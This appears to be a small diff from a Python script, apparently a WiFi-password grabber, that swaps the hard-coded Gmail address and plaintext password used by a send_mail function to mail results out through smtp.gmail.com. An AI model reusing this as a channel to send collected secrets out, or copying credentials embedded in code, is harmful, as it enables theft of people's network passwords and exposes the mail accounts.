@@ -4,8 +4,8 @@ import subprocess, re, smtplib
 def send_mail(email, message):
     server = smtplib.SMTP("smtp.gmail.com", 587)
     server.starttls()
-    sender_email = "penetrationwifi@gmail.com"
-    password = "penetrationwifi@2021"
+    sender_email = "wifipwd9@gmail.com"
+    password = "cybersec101"
     server.login(sender_email, password)
     server.sendmail(sender_email, email, message)
     server.quit()
